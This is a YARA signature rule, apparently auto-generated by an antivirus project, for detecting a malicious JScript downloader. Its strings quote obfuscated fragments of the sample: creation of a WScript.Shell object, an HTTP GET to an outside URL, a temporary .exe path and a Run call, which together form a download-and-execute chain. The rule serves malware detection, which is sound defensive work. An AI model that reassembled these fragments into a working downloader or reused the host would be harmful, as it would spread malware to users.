rule sig_20160401_1414a3205762047216c5f287a043cb3c {
  meta:
    description = "datamaliciousorder - file 20160401_1414a3205762047216c5f287a043cb3c.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "c7b2971c11cdc7a08f08bc3406987e39ce2727f25066c608fa48c5f97b65cfbc"

  strings:
    $s1  = "function EvKjv(NwQx, CvYsa){GohTcz = GohTcz * 1; return NwQx - CvYsa;};" fullword ascii
    $s2  = "var EuiHt = function KvSiz() {return WScript[GfRvw](\"WScript\"+\".Shell\");}(), BbJdx = 11;" fullword ascii
    $s3  = "YtVwq[UbxQag](\"G\" + \"ET\", \"http://prawoiznaki.pl/k3usa\", false);" fullword ascii
    $s4  = "if (YtVwq[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function OmqWx(){return IaaHpe + \"\";};" fullword ascii
    $s6  = "function VmDze() {return EuiHt[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"VT6Es7jJ262QHrZn.ex\" + \"e\";};" fullword ascii
    $s7  = "function SfHa() {return ((VdXt == true) && (VdXt == MnvDua)) ? 1 : GohTcz;};" fullword ascii
    $s8  = "function VnbRc()" fullword ascii
    $s9  = "return EvKjv(VlRpx, RoAx);" fullword ascii
    $s10 = "var WumZup = new this[\"Date\"]();" fullword ascii
    $s11 = "var VdXt = false;" fullword ascii
    $s12 = "function TwChn(TmjXro){EuiHt[\"R\"+\"un\"](TmjXro, GohTcz, GohTcz);};" fullword ascii
    $s13 = "}while (FvoFxy);" fullword ascii
    $s14 = "var MnvDua = false;" fullword ascii
    $s15 = "VdXt = true; " fullword ascii
    $s16 = "function YzfVz(){return 23;};" fullword ascii
    $s17 = "function NsLhv(){return GfRvw;};" fullword ascii
    $s18 = "var WtWd = false;" fullword ascii
    $s19 = "MnvDua = true; " fullword ascii
    $s20 = "function LeaUcn(NniQfo) {var NvUk = (1, 2, 3, 4, 5, NniQfo); return NvUk;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}